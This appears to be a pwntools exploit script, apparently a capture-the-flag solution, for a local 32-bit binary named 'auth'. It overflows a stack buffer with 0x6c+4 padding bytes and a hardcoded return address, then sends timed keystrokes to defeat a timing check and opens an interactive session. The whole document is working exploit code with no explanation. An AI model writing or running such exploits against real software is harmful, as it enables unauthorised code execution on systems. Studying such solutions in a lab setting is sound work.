from pwn import *
import sys

payload ="a"*(0x6c+4)
payload+=p32(0xf7e70bc5)
p = process(["./auth", payload])

p.recv()
p.recv()
p.recv()
p.recv()
for i in range(3):
	sleep(0.2)
	p.send("a")

sleep(0.35)
p.send("a")

for i in range(2):
        sleep(0.2)
        p.send("a")

sleep(0.35)
p.send("a")

for i in range(6):
        sleep(0.2)
        p.send("a")

p.interactive()
